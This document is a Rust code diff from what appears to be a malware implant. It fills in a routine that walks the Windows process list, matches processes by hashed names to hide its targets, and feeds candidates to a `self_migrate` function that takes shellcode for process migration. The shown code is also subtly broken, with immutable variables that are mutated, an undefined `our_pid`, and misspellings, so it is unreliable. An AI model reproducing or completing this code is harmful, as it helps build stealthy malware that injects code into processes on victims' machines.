@@ -41,9 +41,9 @@ unsafe fn free_memory(mut buffer: *mut c_void) { unsafe {
     );
 }}
 
-unsafe fn find_processes_by_hash(_target_hahs: u32, _required_session: u32) -> [usize; 4] { unsafe {
+unsafe fn find_processes_by_hash(target_hash: u32, required_session: u32) -> [usize; 4] { unsafe {
     let result = [0usize; 4];
-    let _count = 0usize;
+    let count = 0usize;
 
     // Allocate buffer for NtQuerySystemInformation(SystemProcessInfomration = 5)
     let mut buffer_size: u32 = 1024 * 256; // 256KB initial
@@ -86,8 +86,50 @@ unsafe fn find_processes_by_hash(_target_hahs: u32, _required_session: u32) -> [
         }
     }
 
-    // TODO: Walk the linked list of SYSTEM_PROCESS_INFORMATION
-    unimplemented!()
+    // Walk the linked list of SYSTEM_PROCESS_INFORMATION
+    let mut entry = buffer as *const SystemProcessInformation;
+
+    loop {
+        let pid = (*entry).unique_process_id;
+
+        // Skip System (PID 0/4) and our own process
+        if pid > 4 && pid != our_pid && !(*entry).image_name.buffer.is_null() {
+            let name_len = (*entry).image_name.length as usize / 2;
+            let name = core::slice::from_raw_parts((*entry).image_name.buffer, name_len);
+
+            let mut hash: u32 = hashes::HASH_SEED;
+            for &wide in name {
+                let byte = (wide & 0xFF) as u8;
+                let c = if byte >= b'A' && byte <= b'Z' {
+                    byte + 32 
+                } else {
+                    byte
+                };
+                hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
+            }
+            hash ^= hashes::HASH_SEED;
+
+            if hash == target_hash {
+                // Check session ID
+                let session = (*entry).session_id;
+                if session == required_session {
+                    result[count] = pid;
+                    count += 1;
+                    if count >= 4 {
+                        break
+                    }
+                }
+            }
+        }
+
+        if (*entry).next_entry_offset == 0 {
+            break;
+        }
+        entry = (entry as usize + (*entry).next_entry_offset as usize) as *const SystemProcessInformation;
+    }
+
+    free_memory(buffer);
+    result
 }}
 
 pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
@@ -99,8 +141,12 @@ pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
     let our_session = get_own_session_id();
     for (idx, &hash) in CANDIDATES.iter().enumerate() {
         debug!("[MIGRATE] Trying target #{}", idx);
-        let _pid = find_processes_by_hash(hash, our_session);
+        let pids = find_processes_by_hash(hash, our_session);
+        if pids[0] == 0 {
+            debug!("[MIGRATE]   #{} - not found or worng session", idx);
+            continue;
+        }
     }
-
+    
     true
 }}
